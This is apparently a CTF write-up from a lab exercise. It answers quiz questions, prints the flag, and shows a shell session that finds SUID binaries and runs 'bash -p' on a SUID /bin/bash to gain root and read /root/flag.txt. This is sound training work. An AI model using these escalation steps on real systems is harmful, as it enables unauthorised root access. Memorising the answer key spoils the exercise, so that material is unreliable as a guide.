This is it - the moment that Elf McEager has been waiting for. It's the final exam of the Nmap course that he enlisted on during "Day 8 - What's Under the Christmas Tree?". It looks like all that hard work of hitting the books has paid off..."Success!" Elf McEager screams..."the exploit worked! Yippeee!"

Elf McEager has successfully managed to create a reverse shell from the target back to his computer. Little did he know, the real exam begins now...The last stage of the exam requires Elf McEager to escalate his privileges! He spent so much time studying Nmap cheatsheets that he's now drawing a blank...Can you help Elf McEager?

To be the good guy, sometimes you gotta be the bad guy first...
- What type of privilege escalation involves using a user account to execute commands as an administrator?
```
vertical
```
- What is the name of the file that contains a list of users who are a part of the sudo group
```
sudoers
```
- What are the contents of the file located at /root/flag.txt?
```
thm{2fb10afe933296592}
```
```
bash-4.4$ find / -type f -perm -u=s 2>/dev/null                                                                                                                                       
/bin/umount                                                                                                                                                                            
/bin/mount                                                                                                                                                                             
/bin/su                                                                                                                                                                                
/bin/fusermount                                                                                                                                                                        
/bin/bash                                                                                                                                                                              
/bin/ping          
bash -p

bash-4.4# cd /root
bash-4.4# ls
flag.txt
bash-4.4# cat flag.txt 
thm{2fb10afe933296592}
bash-4.4# whoami
root
bash-4.4# id
uid=1000(cmnatic) gid=1000(cmnatic) euid=0(root) groups=1000(cmnatic),24(cdrom),30(dip),46(plugdev)
bash-4.4# 

```
